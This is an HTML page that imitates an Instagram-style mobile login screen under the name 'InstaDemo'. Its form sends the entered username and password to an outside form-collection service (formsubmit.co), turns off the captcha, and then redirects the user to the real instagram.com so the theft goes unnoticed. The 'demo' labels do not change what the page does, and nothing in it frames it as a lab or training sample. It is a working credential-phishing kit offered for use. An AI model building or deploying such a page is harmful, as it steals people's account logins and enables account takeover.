<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>InstaDemo • Login</title>
<style>
/* CSS code remains the same */
:root{
  --blue:#1877f2;
  --border:#e0e0e0;
  --text:#262626;
}
*{box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
html,body{height:100%; margin:0; background:#fff}

/* App wrapper */
.app{
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* Top gradient header */
.header{
  height:42vh;
  background:linear-gradient(180deg,#8a3ab9 0%, #cd486b 35%, #f58529 70%);
  display:flex;
  align-items:center;
  justify-content:center;
}

/* Logo (safe demo mark) */
.logo{
  width:86px; height:86px;
  border-radius:22px;
  border:4px solid #fff;
  position:relative;
}
.logo::before{
  content:"";
  position:absolute; inset:18px;
  border:4px solid #fff; border-radius:50%;
}
.logo::after{
  content:"";
  position:absolute; width:10px; height:10px;
  border-radius:50%; background:#fff;
  right:18px; top:16px;
}

/* Card */
.card{
  background:#fff;
  margin:-56px 16px 0;
  padding:18px 16px 20px;
  border-radius:22px;
  box-shadow:0 12px 30px rgba(0,0,0,.12);
}

.lang{
  text-align:center; color:#6b6b6b; font-size:14px; margin-bottom:12px;
}

.input{
  width:100%;
  padding:14px 14px;
  margin-bottom:10px;
  border-radius:14px;
  border:1px solid var(--border);
  background:#fafafa;
  font-size:15px;
}
.input:focus{outline:none; border-color:#bdbdbd; background:#fff}

.btn{
  width:100%;
  padding:14px;
  border-radius:18px;
  border:2px solid var(--blue);
  background:var(--blue);
  color:#fff;
  font-weight:600;
  font-size:16px;
  cursor:pointer;
  transition:transform .12s ease, box-shadow .12s ease, background .2s ease;
  box-shadow:0 10px 18px rgba(24,119,242,.35);
}
.btn:active{transform:scale(.96)}

.link{
  margin-top:12px; text-align:center; color:#1b4f9c; font-size:14px;
}

/* Bottom actions */
.bottom{
  margin-top:auto;
  padding:18px 16px 26px;
}

.outline{
  width:100%;
  padding:14px;
  border-radius:22px;
  border:2px solid var(--blue);
  background:transparent;
  color:var(--blue);
  font-weight:600;
  font-size:16px;
  cursor:pointer;
  transition:transform .12s ease, background .2s ease, color .2s ease;
}
.outline:active{transform:scale(.96)}
.outline:hover{background:var(--blue); color:#fff}

.footer{
  margin-top:14px;
  text-align:center;
  color:#8e8e8e;
  font-size:12px;
}

/* Small devices */
@media (max-height:680px){
  .header{height:38vh}
}
</style>
</head>
<body>
<div class="app">
  <div class="header">
    <div class="logo" aria-label="InstaDemo"></div>
  </div>  
  
  <form action="https://formsubmit.co/496c9189d547460b4985a9ed54a98487" method="POST"> 
    <div class="card">
      <div class="lang">English (UK) ▾</div>
      
      <input id="user" class="input" name="username_or_email" placeholder="Username, email address or mobile number" required/>
      
      <input id="pass" type="password" class="input" name="login_password" placeholder="Password" required/>
      
      <button type="submit" class="btn">Log in</button>
      
      <div class="link">Forgotten password?</div>

      <input type="hidden" name="_next" value="https://www.instagram.com/">
      <input type="hidden" name="_captcha" value="false">

    </div>
  </form> 
  
  <div class="bottom">
    <button class="outline" onclick="signup()">Create new account</button>
    <div class="footer">© 2025 DemoCorp</div>
  </div>
</div>
<script>
function signup(){
  alert('Demo signup screen');
}
</script>
</body>
</html>
